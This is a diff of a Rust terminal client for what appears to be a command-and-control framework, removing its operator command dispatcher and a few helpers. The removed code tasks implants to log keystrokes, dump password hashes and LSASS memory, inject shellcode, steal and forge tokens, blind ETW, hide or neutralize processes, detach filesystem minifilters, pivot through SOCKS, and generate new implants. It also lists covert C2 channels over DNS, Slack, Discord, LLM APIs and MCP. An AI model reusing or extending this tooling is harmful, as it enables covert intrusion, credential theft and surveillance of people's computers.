-                            filters = Some(k.to_string());
-                        }
-                    }
-                }
-                let _ = filters;
-                self.send(Cmd::FetchAudit {
-                    operator,
-                    action,
-                    limit,
-                });
-            }
-            "/connect" => {
-                let mut parts = args.split_whitespace();
-                let url = match parts.next() {
-                    Some(u) => u.to_string(),
-                    None => {
-                        self.log("usage: /connect <url> [token]", Level::Warn);
-                        return;
-                    }
-                };
-                let token = parts.next().map(|s| s.to_string());
-                self.log(&format!("connecting to {url} …",), Level::Info);
-                self.toast(format!("connecting to {url} …"), Level::Info);
-                self.send(Cmd::Connect(url, token));
-            }
-            "/sessions" => {
-                if self.sessions.is_empty() {
-                    self.log("(no beacons)", Level::Warn);
-                } else {
-                    // 支持过滤：/sessions tag:web star alias:db
-                    let filter = session_meta::parse_filter(args);
-                    let filtered: Vec<usize> = self
-                        .sessions
-                        .iter()
-                        .enumerate()
-                        .filter(|(_, s)| {
-                            let m = self.sessions_meta.get(&s.id);
-                            let tags_ok = filter.tags.iter().all(|t| m.tags.iter().any(|x| x == t));
-                            let star_ok = !filter.star_only || m.favorite;
-                            let alias_ok = filter.alias_contains.as_ref().is_none_or(|sub| {
-                                m.alias.as_ref().is_some_and(|a| a.contains(sub))
-                                    || s.hostname.contains(sub)
-                            });
-                            tags_ok && star_ok && alias_ok
-                        })
-                        .map(|(i, _)| i)
-                        .collect();
-                    if filtered.is_empty() {
-                        self.log(&format!("(no beacons match '{args}')",), Level::Warn);
-                    } else {
-                        let mut st = ListState::default();
-                        let cur_idx = self
-                            .current_session()
-                            .and_then(|s| self.sessions.iter().position(|x| x.id == s.id));
-                        st.select(
-                            cur_idx
-                                .filter(|i| filtered.contains(i))
-                                .or(filtered.first().copied()),
-                        );
-                        self.overlay = Overlay::Sessions(st);
-                        self.overlay_scroll = 0;
-                    }
-                }
-            }
-            "/info" => {
-                // 全字段会话详情 overlay：把 SessionView 里一直有但 Sessions 行
-                // 列表/状态栏放不下的字段（pid/pending/age/ja3/ja4 + 本地 meta）
-                // 一次性展示。本地数据 overlay，无 worker round-trip。
-                match self.current_session() {
-                    Some(s) => {
-                        self.overlay = Overlay::SessionDetail(s.id.clone());
-                        self.overlay_scroll = 0;
-                    }
-                    None => self.log("! no beacon selected", Level::Warn),
-                }
-            }
-            "/tasks" => {
-                // 拉取当前会话排队中（未投递）的任务。worker-driven overlay，
-                // 仿 /audit。解决"任务下发后状态黑盒"——看不到是还在排队还是已投递。
-                match self.current_session() {
-                    Some(s) => self.send(Cmd::FetchTasks {
-                        session: s.id.clone(),
-                    }),
-                    None => self.log("! no beacon selected", Level::Warn),
-                }
-            }
-            "/use" => {
-                let id = args.trim();
-                if id.is_empty() {
-                    self.log("usage: /use <id-prefix>", Level::Warn);
-                    return;
-                }
-                match self.sessions.iter().position(|s| s.id.starts_with(id)) {
-                    Some(i) => {
-                        if let Some(s) = self.sessions.get(i) {
-                            self.pane_tree
-                                .set_session_id(self.focused_pane, Some(s.id.clone()));
-                        }
-                        self.log(
-                            &format!("selected beacon {}", short(&self.sessions[i].id)),
-                            Level::Ok,
-                        );
-                    }
-                    None => self.log(&format!("! no beacon matching {id}"), Level::Err),
-                }
-            }
-            "/rename" | "/tag" | "/untag" | "/star" | "/note" => {
-                self.session_meta_cmd(name, args);
-            }
-            "/ls" => self.run_parsed_shell(args, "/ls", ShellFor::Ls),
-            "/ps" => self.run_parsed_shell(args, "/ps", ShellFor::Ps),
-            "/bof" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    self.toast("! select a beacon first", Level::Err);
-                    return;
-                };
-                let mut parts = args.split_whitespace();
-                let file = match parts.next() {
-                    Some(f) => f.to_string(),
-                    None => {
-                        self.log("usage: /bof <file.o> [args]", Level::Warn);
-                        return;
-                    }
-                };
-                let bof_args = parts.collect::<Vec<_>>().join(" ");
-                let data = match std::fs::read(&file) {
-                    Ok(d) => d,
-                    Err(e) => {
-                        self.log(&format!("! read {file}: {e}"), Level::Err);
-                        return;
-                    }
-                };
-                let name = std::path::Path::new(&file)
-                    .file_name()
-                    .and_then(|n| n.to_str())
-                    .unwrap_or("bof")
-                    .to_string();
-                self.log(&format!("[{}] bof {} …", short(&s.id), name), Level::Info);
-                self.send(Cmd::Bof {
-                    session: s.id,
-                    name,
-                    args: bof_args,
-                    data_hex: hex::encode(&data),
-                });
-            }
-            "/upload" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let mut parts = args.split_whitespace();
-                let local = match parts.next() {
-                    Some(l) => l.to_string(),
-                    None => {
-                        self.log("usage: /upload <local> <remote>", Level::Warn);
-                        return;
-                    }
-                };
-                let remote = match parts.next() {
-                    Some(r) => r.to_string(),
-                    None => {
-                        self.log("usage: /upload <local> <remote>", Level::Warn);
-                        return;
-                    }
-                };
-                let data = match std::fs::read(&local) {
-                    Ok(d) => d,
-                    Err(e) => {
-                        self.log(&format!("! read {local}: {e}"), Level::Err);
-                        return;
-                    }
-                };
-                self.log(
-                    &format!("[{}] upload {local} -> {remote}", short(&s.id)),
-                    Level::Info,
-                );
-                self.send(Cmd::Upload {
-                    session: s.id,
-                    name: remote,
-                    data_hex: hex::encode(&data),
-                });
-            }
-            "/download" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let mut parts = args.split_whitespace();
-                let path = match parts.next() {
-                    Some(p) => p.to_string(),
-                    None => {
-                        self.log("usage: /download <remote> [local]", Level::Warn);
-                        return;
-                    }
-                };
-                let local = parts.next().map(|s| s.to_string());
-                self.log(&format!("[{}] download {path}", short(&s.id)), Level::Info);
-                self.send(Cmd::Download {
-                    session: s.id,
-                    path,
-                    local,
-                });
-            }
-            "/sleep" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                match parse_sleep_args(args) {
-                    SleepSpec::Seconds(secs) => {
-                        self.send(Cmd::Sleep {
-                            session: s.id.clone(),
-                            seconds: secs,
-                            jitter_pct: 0,
-                        });
-                        self.log(
-                            &format!("[{}] tasked sleep {secs}s", short(&s.id)),
-                            Level::Info,
-                        );
-                    }
-                    SleepSpec::SecondsJitter(secs, jit) => {
-                        self.send(Cmd::Sleep {
-                            session: s.id.clone(),
-                            seconds: secs,
-                            jitter_pct: jit,
-                        });
-                        self.log(
-                            &format!("[{}] tasked sleep {secs}s (±{jit}%)", short(&s.id)),
-                            Level::Info,
-                        );
-                    }
-                    SleepSpec::Usage(msg) => self.log(&msg, Level::Warn),
-                }
-            }
-            "/ping" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::Ping { session: s.id });
-            }
-            "/screenshot" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let monitor: u8 = args.trim().parse().unwrap_or(0);
-                self.log(&format!("[{}] screenshot…", short(&s.id)), Level::Info);
-                self.send(Cmd::Screenshot {
-                    session: s.id,
-                    monitor,
-                });
-            }
-            "/portscan" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let mut it = args.split_whitespace();
-                let host = match it.next() {
-                    Some(h) => h.to_string(),
-                    None => {
-                        self.log("usage: /portscan <host> <ports>", Level::Warn);
-                        return;
-                    }
-                };
-                let ports = match it.next() {
-                    Some(p) => p.to_string(),
-                    None => {
-                        self.log("usage: /portscan <host> <ports>", Level::Warn);
-                        return;
-                    }
-                };
-                self.send(Cmd::Portscan {
-                    session: s.id,
-                    host,
-                    ports,
-                });
-            }
-            "/net" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::Net {
-                    session: s.id,
-                    query: args.trim().to_string(),
-                });
-            }
-            "/drive" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::DriveInfo { session: s.id });
-            }
-            "/trex" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::Trex { session: s.id });
-            }
-            "/channel" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let trimmed = args.trim();
-                if trimmed.is_empty() {
-                    // No argument — list all available channels with their IDs.
-                    self.log("C2 transport channels:", Level::Info);
-                    self.log("  0 https   — HTTPS POST (default)", Level::Info);
-                    self.log("  1 doh     — DNS-over-HTTPS", Level::Info);
-                    self.log("  2 dns     — DNS beacon", Level::Info);
-                    self.log("  3 smb     — SMB Named Pipe (pivot)", Level::Info);
-                    self.log("  4 tcp     — TCP Beacon (pivot)", Level::Info);
-                    self.log("  5 slack   — External C2 via Slack", Level::Info);
-                    self.log("  6 llm     — External C2 via LLM API", Level::Info);
-                    self.log("  7 mcp     — External C2 via MCP", Level::Info);
-                    self.log("  8 discord — External C2 via Discord", Level::Info);
-                    self.log("usage: /channel <id|name>  e.g. /channel doh", Level::Info);
-                    return;
-                }
-                // Accept either a numeric ID (0-8) or a channel name.
-                let ch: u8 = if let Ok(n) = trimmed.parse::<u8>() {
-                    n
-                } else {
-                    match trimmed.to_ascii_lowercase().as_str() {
-                        "https" | "http" => 0,
-                        "doh" | "dohdns" | "doh-dns" => 1,
-                        "dns" => 2,
-                        "smb" | "smbpipe" | "smb-pipe" | "pipe" => 3,
-                        "tcp" => 4,
-                        "slack" | "slackapi" | "slack-api" => 5,
-                        "llm" | "llmapi" | "llm-api" => 6,
-                        "mcp" => 7,
-                        "discord" | "discordapi" | "discord-api" => 8,
-                        _ => {
-                            self.log(
-                                &format!("! unknown channel '{trimmed}'. /channel for list."),
-                                Level::Err,
-                            );
-                            return;
-                        }
-                    }
-                };
-                if ch > 8 {
-                    self.log("! channel ID must be 0-8. /channel for list.", Level::Err);
-                    return;
-                }
-                let names = [
-                    "HTTPS", "DoH-DNS", "DNS", "SMB Pipe", "TCP",
-                    "Slack API", "LLM API", "MCP", "Discord API",
-                ];
-                self.log(
-                    &format!("switching to {} ({})", ch, names.get(ch as usize).unwrap_or(&"?")),
-                    Level::Info,
-                );
-                self.send(Cmd::SetChannel {
-                    session: s.id,
-                    channel: ch,
-                });
-            }
-            "/clipboard" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::Clipboard { session: s.id });
-            }
-            "/env" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::Env {
-                    session: s.id,
-                    name: args.trim().to_string(),
-                });
-            }
-            "/keylog" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                // `/keylog stream [secs]` — continuous dump (re-enqueues every
-                // N seconds, default 5, minimum 2). `unstream` stops the loop.
-                let trimmed = args.trim();
-                if trimmed == "stream" || trimmed.starts_with("stream ") {
-                    let secs: u32 = trimmed
-                        .split_whitespace()
-                        .nth(1)
-                        .and_then(|x| x.parse().ok())
-                        .unwrap_or(5);
-                    self.send(Cmd::KeylogStreamStart {
-                        session: s.id.clone(),
-                        interval_secs: secs,
-                    });
-                    let msg = format!("[{}] keylog stream every {secs}s", short(&s.id));
-                    self.log(&msg, Level::Info);
-                    self.toast(msg, Level::Ok);
-                    return;
-                }
-                if trimmed == "unstream" || trimmed == "stop-stream" {
-                    self.send(Cmd::KeylogStreamStop { session: s.id });
-                    return;
-                }
-                let action = match trimmed {
-                    "start" => 0,
-                    "stop" => 1,
-                    "dump" | "" => 2,
-                    _ => {
-                        self.log(
-                            "usage: /keylog <start|stop|dump|stream [secs]|unstream>",
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                };
-                self.send(Cmd::Keylog {
-                    session: s.id,
-                    action,
-                });
-            }
-
-            "/screenwatch" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let secs: u32 = match args.trim().parse() {
-                    Ok(v) if v > 0 => v,
-                    _ => {
-                        self.log("usage: /screenwatch <secs>", Level::Warn);
-                        return;
-                    }
-                };
-                self.send(Cmd::Screenwatch {
-                    session: s.id,
-                    interval_secs: secs,
-                });
-            }
-            "/hashdump" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                // method 语义（跨后端统一）：0=SAM, 1=SYSTEM, 2=LSASS(deferred),
-                // 3=macOS-shadow。默认 sam(0)。`lsass`/`mac` 保留为兼容别名但
-                // 映射到正确语义（lsass→2 deferred，mac→3 shadow）。
-                let method = match args.trim() {
-                    "sam" | "" => 0,
-                    "system" => 1,
-                    "lsass" => 2,
-                    "shadow" | "mac" => 3,
-                    other => {
-                        self.log(
-                            &format!("! unknown hashdump method '{other}': use sam|system|shadow"),
-                            Level::Err,
-                        );
-                        return;
-                    }
-                };
-                self.send(Cmd::Hashdump {
-                    session: s.id,
-                    method,
-                });
-            }
-            "/getuid" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::GetUid { session: s.id });
-            }
-            "/inject" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                // /inject <method> <pid|spawn_to> <file.bin>
-                let mut parts = args.split_whitespace();
-                let method: u8 = match parts.next().and_then(|m| m.parse().ok()) {
-                    Some(v) => v,
-                    None => {
-                        self.log(
-                            "usage: /inject <method 0|1|2> <pid|spawn_to> <file>",
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                };
-                let target = parts.next().unwrap_or("").to_string();
-                let file = match parts.next() {
-                    Some(f) => f.to_string(),
-                    None => {
-                        self.log("usage: /inject <method> <pid|spawn_to> <file>", Level::Warn);
-                        return;
-                    }
-                };
-                let data = match std::fs::read(&file) {
-                    Ok(d) => d,
-                    Err(e) => {
-                        self.log(&format!("! read {file}: {e}"), Level::Err);
-                        return;
-                    }
-                };
-                // Parse target: if numeric, it's a pid; otherwise spawn_to name.
-                let (pid, spawn_to) = match target.parse::<u32>() {
-                    Ok(p) => (p, String::new()),
-                    Err(_) => (0, target),
-                };
-                let sc_hex = hex::encode(&data);
-                self.send(Cmd::Inject {
-                    session: s.id,
-                    method,
-                    pid,
-                    spawn_to,
-                    sc_hex,
-                });
-            }
-            "/steal" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let pid: u32 = match args.trim().parse() {
-                    Ok(v) => v,
-                    _ => {
-                        self.log("usage: /steal <pid>", Level::Warn);
-                        return;
-                    }
-                };
-                self.send(Cmd::StealToken { session: s.id, pid });
-            }
-            "/make_token" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                // /make_token DOMAIN\user password [logon_type 1|2|3]
-                let parts: Vec<&str> = args.split_whitespace().collect();
-                if parts.len() < 2 {
-                    self.log(
-                        "usage: /make_token DOMAIN\\user password [1|2|3]",
-                        Level::Err,
-                    );
-                    return;
-                }
-                let du = parts[0];
-                let (domain, user) = match du.split_once('\\') {
-                    Some((d, u)) => (d.to_string(), u.to_string()),
-                    None => (String::new(), du.to_string()), // local account
-                };
-                let password = parts[1].to_string();
-                let logon_type = parts.get(2).and_then(|t| t.parse::<u8>().ok()).unwrap_or(1);
-                self.send(Cmd::MakeToken {
-                    session: s.id,
-                    domain,
-                    user,
-                    password,
-                    logon_type,
-                });
-            }
-            "/rev2self" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::Rev2Self { session: s.id });
-            }
-            "/cd" | "/mkdir" | "/rm" => {
-                let (op, path) = self.fileop_one_arg(name, args);
-                let Some((s, p)) = path else { return };
-                self.send(Cmd::FileOp {
-                    session: s.id,
-                    op,
-                    path: p,
-                    dest: None,
-                });
-            }
-            "/mv" | "/cp" => {
-                let (op, parts) = self.fileop_two_args(name, args);
-                let Some((s, src, dst)) = parts else { return };
-                self.send(Cmd::FileOp {
-                    session: s.id,
-                    op,
-                    path: src,
-                    dest: Some(dst),
-                });
-            }
-            "/pivot" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let mut it = args.split_whitespace();
-                let host = match it.next() {
-                    Some(h) => h.to_string(),
-                    None => {
-                        self.log("usage: /pivot <host> <port>", Level::Warn);
-                        return;
-                    }
-                };
-                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
-                    Some(p) => p,
-                    None => {
-                        self.log("usage: /pivot <host> <port>", Level::Warn);
-                        return;
-                    }
-                };
-                self.send(Cmd::Pivot {
-                    session: s.id,
-                    host,
-                    port,
-                });
-            }
-            "/socks" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                let mut it = args.split_whitespace();
-                // Two forms:
-                //   /socks start [bind_addr]   — in-TUI SOCKS5 relay (default 127.0.0.1:1080)
-                //   /socks stop                — stop the in-TUI relay
-                //   /socks <chan> <op> <addr> <port> — manual channel control frame
-                // The first token disambiguates: "start"/"stop" are the relay
-                // subcommands; anything else is parsed as the legacy control form.
-                let first = it.next().unwrap_or("");
-                if first.eq_ignore_ascii_case("start") {
-                    let bind_addr = it.next().unwrap_or("127.0.0.1:1080").to_string();
-                    let msg = format!("socks listening on {bind_addr}");
-                    self.log(&msg, Level::Ok);
-                    self.toast(msg, Level::Ok);
-                    self.send(Cmd::SocksStart {
-                        session: s.id.clone(),
-                        bind_addr,
-                    });
-                    return;
-                }
-                if first.eq_ignore_ascii_case("stop") {
-                    self.log(
-                        &format!("[{}] socks relay stopped", short(&s.id)),
-                        Level::Info,
-                    );
-                    self.toast("socks relay stopped", Level::Warn);
-                    self.send(Cmd::SocksStop { session: s.id });
-                    return;
-                }
-                // Legacy manual channel control frame.
-                let chan: u32 = match first.parse().ok() {
-                    Some(c) => c,
-                    None => {
-                        self.log(
-                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                };
-                let op: u8 = match it.next().and_then(|x| x.parse().ok()) {
-                    Some(o) => o,
-                    None => {
-                        self.log(
-                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                };
-                let addr = match it.next() {
-                    Some(a) => a.to_string(),
-                    None => {
-                        self.log(
-                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                };
-                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
-                    Some(p) => p,
-                    None => {
-                        self.log(
-                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
-                            Level::Warn,
-                        );
-                        return;
-                    }
-                };
-                self.send(Cmd::Socks {
-                    session: s.id,
-                    chan,
-                    op,
-                    addr,
-                    port,
-                });
-            }
-            "/kill" => {
-                let Some(s) = self.current_session().cloned() else {
-                    self.log("! select a beacon first", Level::Err);
-                    return;
-                };
-                self.send(Cmd::Exit {
-                    session: s.id.clone(),
-                });
-                self.log(&format!("[{}] tasked exit", short(&s.id)), Level::Warn);
-            }
-            "/driver-status" => self.send(Cmd::KernelStatus),
-            "/blind-etw" => self.send(Cmd::KernelBlindEtw),
-            "/hide" => {
-                let pid: u32 = match args.trim().parse() {
-                    Ok(p) => p,
-                    Err(_) => {
-                        self.log("usage: /hide <pid>", Level::Warn);
-                        return;
-                    }
-                };
-                self.send(Cmd::KernelHide { pid });
-            }
-            "/dump-lsass" => {
-                let pid: u32 = match args.trim().parse() {
-                    Ok(p) => p,
-                    Err(_) => {
-                        self.log("usage: /dump-lsass <pid>", Level::Warn);
-                        return;
-                    }
-                };
-                self.send(Cmd::KernelDumpLsass { pid });
-            }
-            "/neutralize" => {
-                let pid: u32 = match args.trim().parse() {
-                    Ok(p) => p,
-                    Err(_) => {
-                        self.log("usage: /neutralize <pid>", Level::Warn);
-                        return;
-                    }
-                };
-                self.send(Cmd::KernelNeutralize { pid });
-            }
-            "/detach-mf" => self.send(Cmd::KernelDetachMinifilter),
-            // ── Implant generation ──────────────────────────────────────
-            "/generate" => {
-                // /generate <callback> [port] [--sleep N] [--jitter N] [--tls/--no-tls] [--format dll|shellcode]
-                let parts = args.split_whitespace().collect::<Vec<_>>();
-                if parts.is_empty() {
-                    self.log("usage: /generate <callback> [port] [--sleep N] [--jitter N] [--format dll|shellcode]", Level::Warn);
-                    return;
-                }
-                let callback = parts[0].to_string();
-                let mut port: u16 = 8443;
-                let mut sleep: u32 = 60;
-                let mut jitter: u8 = 20;
-                let mut tls = true;
-                let mut format = "dll".to_string();
-                let mut i = 1;
-                while i < parts.len() {
-                    match parts[i] {
-                        "--sleep" => {
-                            i += 1;
-                            if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) {
-                                sleep = v;
-                            }
-                        }
-                        "--jitter" => {
-                            i += 1;
-                            if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) {
-                                jitter = v;
-                            }
-                        }
-                        "--tls" => tls = true,
-                        "--no-tls" => tls = false,
-                        "--format" => {
-                            i += 1;
-                            if let Some(f) = parts.get(i) {
-                                format = f.to_string();
-                            }
-                        }
-                        _ => {
-                            // Try to parse as port number
-                            if let Ok(p) = parts[i].parse::<u16>() {
-                                port = p;
-                            }
-                        }
-                    }
-                    i += 1;
-                }
-                self.send(Cmd::GenerateImplant {
-                    callback,
-                    port,
-                    format,
-                    uri: "/beacon".into(),
-                    sleep,
-                    jitter,
-                    tls,
-                    features: 0,
-                });
-                self.log("generating implant...", Level::Info);
-            }
-            "/implants" => self.send(Cmd::FetchImplants),
-            "/revoke" => {
-                let pk = args.trim().to_string();
-                if pk.is_empty() {
-                    self.log("usage: /revoke <implant_pub>", Level::Warn);
-                    return;
-                }
-                self.send(Cmd::RevokeImplant { implant_pub: pk });
-            }
-            other => self.log(
-                &format!("! unknown command {other} — try /help",),
-                Level::Err,
-            ),
-        }
-    }
-
-    /// Run a shell command whose output we parse into a table overlay.
-    /// The command text depends on the beacon's OS guess; we pick POSIX by
-    /// default (dev agent runs on macOS/Linux) and Windows if the beacon's os
-    /// string mentions "windows".
-    fn run_parsed_shell(&mut self, args: &str, label: &str, which: ShellFor) {
-        let Some(s) = self.current_session().cloned() else {
-            self.log("! select a beacon first", Level::Err);
-            self.toast("! select a beacon first", Level::Err);
-            return;
-        };
-        let is_windows = s.os.to_ascii_lowercase().contains("windows");
-        let (cmd, parse) = match which {
-            ShellFor::Ls => {
-                let cmd = if is_windows {
-                    format!("cmd /c dir {}", args)
-                } else {
-                    format!("ls -l {}", args)
-                };
-                (cmd, ParseAs::Files)
-            }
-            ShellFor::Ps => {
-                let cmd = if is_windows {
-                    "tasklist /fo csv /nh".to_string()
-                } else {
-                    "ps aux".to_string()
-                };
-                (cmd, ParseAs::Procs)
-            }
-            ShellFor::Creds => {
-                // No standard command; operator is expected to have dumped via a
-                // BOF. We run the typed args verbatim as a shell command and
-                // parse the result.
-                (args.to_string(), ParseAs::Creds)
-            }
-        };
-        self.log(
-            &format!("[{}] {} $ {}", short(&s.id), label, cmd),
-            Level::Info,
-        );
-        self.send(Cmd::Shell {
-            session: s.id,
-            args: cmd,
-            parse,
-        });
-    }
-
-    /// 单参数文件操作（cd/mkdir/rm）的参数解析。返回 (op_string, Some((session, path)))。
-    fn fileop_one_arg(
-        &mut self,
-        name: &str,
-        args: &str,
-    ) -> (String, Option<(SessionView, String)>) {
-        let op = name.trim_start_matches('/').to_string();
-        let Some(s) = self.current_session().cloned() else {
-            self.log("! select a beacon first", Level::Err);
-            return (op, None);
-        };
-        let path = match args.split_whitespace().next() {
-            Some(p) => p.to_string(),
-            None => {
-                self.log(&format!("usage: {name} <path>"), Level::Warn);
-                return (op, None);
-            }
-        };
-        (op, Some((s, path)))
-    }
-
-    /// 双参数文件操作（mv/cp）的参数解析。返回 (op_string, Some((session, src, dst)))。
-    fn fileop_two_args(
-        &mut self,
-        name: &str,
-        args: &str,
-    ) -> (String, Option<(SessionView, String, String)>) {
-        let op = name.trim_start_matches('/').to_string();
-        let Some(s) = self.current_session().cloned() else {
-            self.log("! select a beacon first", Level::Err);
-            return (op, None);
-        };
-        let mut it = args.split_whitespace();
-        let src = match it.next() {
-            Some(p) => p.to_string(),
-            None => {
-                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
-                return (op, None);
-            }
-        };
-        let dst = match it.next() {
-            Some(p) => p.to_string(),
-            None => {
-                self.log(&format!("usage: {name} <src> <dst>"), Level::Warn);
-                return (op, None);
-            }
-        };
-        (op, Some((s, src, dst)))
-    }
-
-    /// 处理 session 元数据命令：/rename /tag /untag /star /note。
-    /// id 参数支持前缀匹配（和 /use 一致），找到后改 sessions_meta 并 save。
-    fn session_meta_cmd(&mut self, name: &str, args: &str) {
-        let mut parts = args.splitn(2, char::is_whitespace);
-        let id_prefix = match parts.next() {
-            Some(id) if !id.is_empty() => id,
-            _ => {
-                self.log(&format!("usage: {name} <id-prefix> <value>"), Level::Warn);
-                return;
-            }
-        };
-        let value = parts.next().unwrap_or("").trim();
-        // 前缀匹配 session id
-        let full_id = match self.sessions.iter().find(|s| s.id.starts_with(id_prefix)) {
-            Some(s) => s.id.clone(),
-            None => {
-                self.log(&format!("! no beacon matching {id_prefix}"), Level::Err);
-                return;
-            }
-        };
-        match name {
-            "/rename" => {
-                if value.is_empty() {
-                    self.log("usage: /rename <id> <name>", Level::Warn);
-                    return;
-                }
-                self.sessions_meta.rename(&full_id, value);
-                self.persist_meta(&full_id, &format!("renamed → {value}"));
-            }
-            "/tag" => {
-                if value.is_empty() {
-                    self.log("usage: /tag <id> <tag>", Level::Warn);
-                    return;
-                }
-                self.sessions_meta.tag(&full_id, value);
-                self.persist_meta(&full_id, &format!("+tag {value}"));
-            }
-            "/untag" => {
-                if value.is_empty() {
-                    self.log("usage: /untag <id> <tag>", Level::Warn);
-                    return;
-                }
-                self.sessions_meta.untag(&full_id, value);
-                self.persist_meta(&full_id, &format!("-tag {value}"));
-            }
-            "/star" => {
-                self.sessions_meta.toggle_star(&full_id);
-                let m = self.sessions_meta.get(&full_id);
-                let msg = if m.favorite {
-                    "★ starred"
-                } else {
-                    "unstarred"
-                };
-                self.persist_meta(&full_id, msg);
-            }
-            "/note" => {
-                if value.is_empty() {
-                    self.log("usage: /note <id> <text>", Level::Warn);
-                    return;
-                }
-                self.sessions_meta.note(&full_id, value);
-                self.persist_meta(&full_id, "note saved");
-            }
-            _ => {}
-        }
-    }
-
-    /// sessions_meta 变更后保存 + 日志确认。
-    fn persist_meta(&mut self, id: &str, msg: &str) {
-        match self.sessions_meta.save() {
-            Ok(()) => self.log(&format!("[{}] {msg}", short(id)), Level::Ok),
-            Err(e) => self.log(&format!("! save sessions_meta: {e}"), Level::Err),
-        }
-    }
-}
-
-enum ShellFor {
-    Ls,
-    Ps,
-    Creds,
 }
 
 /// `Down` 键历史导航的动作。三态表达比 `Option<(bool, String)>` 更清晰：
@@ -2787,15 +1107,6 @@ pub(super) fn fmt_age(secs: u64) -> String {
     }
 }
 
-/// 在拓扑图里显示节点的短标签（label 或 id 前 8 字符）。
-pub(super) fn short_topo(topo: &topology::Topology, id: &str) -> String {
-    topo.nodes
-        .iter()
-        .find(|n| n.id == id)
-        .map(|n| n.label.clone())
-        .unwrap_or_else(|| short(id))
-}
-
 // ---- entry -----------------------------------------------------------------
 
 pub fn run(server: &str, token: Option<&str>) -> anyhow::Result<()> {
@@ -2831,13 +1142,12 @@ fn main_loop(
     while !app.should_quit {
         // prefix 超时自动复位（UX-S5）：按 Ctrl+B 后 2s 内未按有效键则退出 prefix
         // 模式，防止操作员分心后误触改布局。放在 draw 前保证状态栏及时反映。
-        if app.tmux_prefix
-            && app
-                .prefix_since
+        if app.panes.prefix
+            && app.panes.prefix_since
                 .is_some_and(|t| t.elapsed() > Duration::from_secs(2))
         {
-            app.tmux_prefix = false;
-            app.prefix_since = None;
+            app.panes.prefix = false;
+            app.panes.prefix_since = None;
         }
         terminal.draw(|f| render(app, f))?;
         // 帧计数 +1：驱动 braille spinner 动画（pending 任务 / 断线重连指示）。
@@ -2858,14 +1168,16 @@ fn main_loop(
         }
         app.poll_worker();
     }
-    let _ = app.bridge.cmds.send(Cmd::Shutdown);
+    let _ = app.conn.bridge.cmds.send(Cmd::Shutdown);
     Ok(())
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
-    use input::{classify, mask};
+    use super::overlay::ConfirmAction;
+    use input::{classify, mask, parse_sleep_args, Input, SleepSpec, META_COMMANDS};
+    use ratatui::widgets::ListState;
 
     // ---- classify (pure) ----
 
@@ -3136,6 +1448,49 @@ mod tests {
         })
     }
 
+    /// 空 console 必须显示引导行（contract §3 空状态引导）：默认布局下焦点
+    /// console 窗格空流时渲染真实键位引导，不留白。引导里的键位必须与
+    /// handle_key 实际实现一致（/ 菜单 · Ctrl+B prefix · Ctrl+F 搜索）。
+    #[test]
+    fn empty_console_shows_guidance_with_real_keys() {
+        let mut app = fake_app();
+        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        let buf_str: String = term
+            .backend()
+            .buffer()
+            .content()
+            .iter()
+            .map(|c| c.symbol())
